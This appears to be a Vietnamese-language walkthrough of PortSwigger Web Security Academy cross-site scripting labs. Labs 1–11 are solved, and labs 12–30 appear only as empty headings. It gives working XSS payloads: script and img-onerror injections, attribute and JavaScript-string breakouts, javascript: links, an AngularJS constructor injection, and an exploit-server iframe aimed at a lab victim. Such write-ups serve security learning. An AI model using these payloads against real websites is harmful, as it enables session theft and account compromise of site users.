# 1. Reflected XSS into HTML context with nothing encoded
Search với từ khóa `<script>alert(1)</script>`, kết quả thành công.

# 2. Stored XSS into HTML context with nothing encoded
Comment với nội dung `<script>alert(1)</script>`, kết quả thành công.

# 3. DOM XSS in `document.write` sink using source `location.search`
Xem source code, ta thấy đọc script sau:
```
<script>
    function trackSearch(query) {
        document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
        trackSearch(query);
    }
</script>
```
Như vậy, ta escape string và exploit xss bằng cách search với từ khóa `"><script>alert(1)</script>`. Kết quả thành công.

# 4. DOM XSS in `innerHTML` sink using source `location.search`
Search với từ khóa `<img src=1 onerror=alert(1)>`, kết quả thành công.

# 5. DOM XSS in jQuery anchor `href` attribute sink using `location.search` source
Ta thấy trong trang feedback có một "Back" link. Thuộc tính href trùng với parameter "returnPath" trong URL.

Như vậy, ta truy cập `/feedback?returnPath=javascript:alert(1)`, khi đó nút "Back" sẽ là:
```
<a id="backLink" href="javascript:alert(1)">Back</a>
```
Nhấn vào "Back", kết quả thành công.

# 6. DOM XSS in jQuery selector sink using a hashchange event
Website sử dụng onhashchange event để xác định chuỗi hash, sau đó dùng jQuery để tìm và scroll đến vị trí phù hợp.

![image](https://user-images.githubusercontent.com/103978452/208067541-71b34f77-dad3-4e87-9fd7-51db73e5427d.png)

Nếu ta đặt chuỗi hash thành `#<img src=1 onerror=alert(1)>` thì đoạn code sẽ là
```
var post = $('section.blog-list h2:contains(<img src=1 onerror=alert(1)>)');
```
Website sử dụng jQuery 1.8.2, như vậy phần tag `<img>` sẽ được parse và lệnh alert được thực thi. Thử submit, kết quả đúng như mong muốn.

Vào exploit server, cấu hình đoạn code sau:
```
<iframe src="https://0aed002b04df0f7ac0d9138e00280008.web-security-academy.net/#" onload="this.src+='<img src=1 onerror=print()>'"></iframe>
```
Như vậy ngay khi user truy cập, URL sẽ tự động thêm đoạn hash và gọi hàm print(). Click "Deliver to victim", kết quả thành công.

# 7. Reflected XSS into attribute with angle brackets HTML-encoded
Ta thấy dấu đóng mở tag đã bị encode, và search string xuất hiện ở 2 vị trí:
    
+) Trong tag h1: `<h1>0 search results for 'abc'</h1>`
    
+) Trong value của tag input: `<input type=text placeholder='Search the blog...' name=search value="abc">`
    
Như vậy, ta có thể escape value attribute và inject xss bằng cách search: `" onfocus=alert(1) autofocus="`
    
Kết quả, bài lab được giải.

# 8. Stored XSS into anchor `href` attribute with double quotes HTML-encoded
Ta thấy trong website attribute dấu nháy kép đã bị encode để vô hiệu việc escape thuộc tính href của tag a. Tuy nhiên ta có thể exploit xss bằng cách upload comment với nội dung thuộc tính website là `javascript:alert(1)`
    
Kết quả, bài lab được giải thành công.
    
# 9. Reflected XSS into a JavaScript string with angle brackets HTML encoded
Ta thấy cả dấu đóng mở tag và dấu nháy kép đã bị encoded, tuy nhiên dấu nháy đơn thì không.

Đoạn script như sau:
![image](https://user-images.githubusercontent.com/103978452/208208780-a249f412-2603-490b-8aa5-c8dbbc4e1c53.png)
Như vậy, nếu ta search với từ khóa `';alert(1);x='a`, đoạn code sẽ trở thành `var searchTerms ='';alert(1);x='a';`. Khi đó, lệnh alert sẽ được thực thi

Thử với cách làm trên, kết quả thành công.

# 10. DOM XSS in `document.write` sink using source `location.search` inside a select element
Trong trang website thông tin chi tiết về 1 sản phẩm, có đoạn script sau

![image](https://user-images.githubusercontent.com/103978452/208209503-988c1e56-28af-4efb-86b3-2b58eaf1188c.png)
Như vậy khi trong Query string có biến `storeId=abc`, thì đoạn text `abc` sẽ được thêm vào website.

Ta thay đổi query string thành `?productId=1&storeId=<script>alert(1)</script>`, kết quả lệnh alert được thực thi thành công.

# 11. DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
Website sử dụng AngularJs. Thử search với từ khóa `{{1+2}}` thì kết quả trả về 3. Như vậy, ta có thể execute code bên trong cặp dấu `{{`.

Nhận thấy dấu đóng mở tag và dấu nháy đơn đã bị encoded, tuy nhiên ta vẫn có thế sử dụng dấu nháy kép. Search với từ khóa `{{constructor.constructor("alert(1)")()}}`, kết quả lệnh alert được thực thi thành công.

# 12. Reflected DOM XSS


# 13. Stored DOM XSS

# 14. Exploiting cross-site scripting to steal cookies

# 15. Exploiting cross-site scripting to capture passwords

# 16. Exploiting XSS to perform CSRF

# 17. Reflected XSS into HTML context with most tags and attributes blocked

# 18. Reflected XSS into HTML context with all tags blocked except custom ones

# 19. Reflected XSS with some SVG markup allowed

# 20. Reflected XSS in canonical link tag

# 21. Reflected XSS into a JavaScript string with single quote and backslash escaped

# 22. Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

# 23. Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

# 24. Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

# 25. Reflected XSS with event handlers and `href` attributes blocked

# 26. Reflected XSS in a JavaScript URL with some characters blocked

# 27. Reflected XSS with AngularJS sandbox escape without strings

# 28. Reflected XSS with AngularJS sandbox escape and CSP

# 29. Reflected XSS protected by very strict CSP, with dangling markup attack

# 30. Reflected XSS protected by CSP, with CSP bypass

